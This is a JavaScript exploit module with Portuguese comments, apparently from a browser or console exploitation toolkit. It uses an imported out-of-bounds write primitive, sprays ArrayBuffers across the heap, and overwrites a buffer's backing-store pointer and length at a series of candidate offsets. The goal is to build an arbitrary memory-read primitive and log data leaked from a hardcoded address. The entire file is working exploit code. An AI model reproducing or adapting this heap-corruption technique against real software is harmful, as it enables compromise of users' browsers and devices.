// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v4)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Exploit de Leitura Arbitrária ---
const ARBITRARY_READ_CONFIG = {
    SPRAY_COUNT: 200,
    BUFFER_SIZE: 256,
    TARGET_READ_ADDRESS: 0x3BD820n,
    OFFSET_TO_BYTE_LENGTH: 8,
    OFFSET_TO_BACKING_STORE: 16,
    corruption_offsets: [
        (128) - 16,
        (128) - 8,
        (128),
        (128) + 8,
        (128) + 16,
    ],
};
// --- Fim dos Parâmetros ---

function readBigInt64(dataview, offset) {
    const low = dataview.getUint32(offset, true);
    const high = dataview.getUint32(offset + 4, true);
    return (BigInt(high) << 32n) | BigInt(low);
}

export async function testArbitraryRead() {
    const FNAME = "testArbitraryRead";
    logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
    logS3(`   Alvo da Leitura: 0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`, "info", FNAME);

    let success = false;
    const SHORT_PAUSE_MS = 50;

    for (const offset of ARBITRARY_READ_CONFIG.corruption_offsets) {
        if (success) break;

        await triggerOOB_primitive();
        if (!oob_write_absolute) {
            logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
            return;
        }

        logS3(`\n>>> Nova Tentativa: Corrompendo offset relativo ${toHex(offset)}`, "info", FNAME);

        let sprayed_buffers = [];
        for (let i = 0; i < ARBITRARY_READ_CONFIG.SPRAY_COUNT; i++) {
            let ab = new ArrayBuffer(ARBITRARY_READ_CONFIG.BUFFER_SIZE);
            new Uint32Array(ab)[0] = 0xDEADBEEF;
            sprayed_buffers.push(ab);
        }
        logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);

        try {
            // CORREÇÃO FINAL: Converter o BigInt para uma string hexadecimal ANTES de criar o AdvancedInt64.
            const targetAddrHex = '0x' + ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16);
            const targetAddrAsInt64 = new AdvancedInt64(targetAddrHex);

            logS3(`  1. Escrevendo ponteiro para ${targetAddrAsInt64.toString()} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, targetAddrAsInt64, 8);

            logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);

            await PAUSE_S3(SHORT_PAUSE_MS);

            for (let i = 0; i < sprayed_buffers.length; i++) {
                const ab = sprayed_buffers[i];
                if (ab.byteLength > ARBITRARY_READ_CONFIG.BUFFER_SIZE) {
                    logS3(`--- SUCESSO: Buffer [${i}] foi corrompido! ---`, "vuln", FNAME);
                    logS3(`   Tamanho original: ${ARBITRARY_READ_CONFIG.BUFFER_SIZE}, Tamanho corrompido: ${ab.byteLength}`, "info", FNAME);
                    
                    let memory_reader_view = new DataView(ab);
                    const leaked_data = readBigInt64(memory_reader_view, 0);

                    const leakedDataHex = `0x${leaked_data.toString(16)}`;
                    logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);

                    success = true;
                    break;
                }
            }
        } catch (e) {
            logS3(`Erro durante a tentativa com offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
        }
        
        sprayed_buffers = null;
        if (typeof globalThis.gc === 'function') {
            globalThis.gc();
        }
        await PAUSE_S3(SHORT_PAUSE_MS);
    }

    clearOOBEnvironment();
    if (success) {
        logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
    } else {
        logS3("--- Teste concluído, não foi possível encontrar um offset vulnerável. ---", "warn", FNAME);
    }
}
